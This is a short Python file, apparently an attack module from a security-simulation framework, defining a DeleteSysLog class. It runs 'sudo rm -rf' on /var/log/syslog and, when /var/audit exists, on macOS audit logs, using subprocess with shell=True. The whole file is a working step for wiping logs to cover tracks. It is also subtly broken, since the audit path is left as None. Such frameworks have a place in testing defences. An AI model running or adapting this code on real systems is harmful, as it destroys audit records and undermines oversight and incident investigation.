from attacks.attack import Attack

import subprocess


class DeleteSysLog(Attack):

    def attack(self):
        syslog_path = "/var/log/syslog"
        macos_audit_path = None
        command = f"sudo rm -rf {syslog_path}; if [ -d /var/audit ] ; then sudo rm -rf {macos_audit_path} ; fi"

        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            print("Command executed successfully.")
            print("Output:")
            print(result.stdout)
        else:
            print("Error executing the command.")
            print("Error message:")
            print(result.stderr)
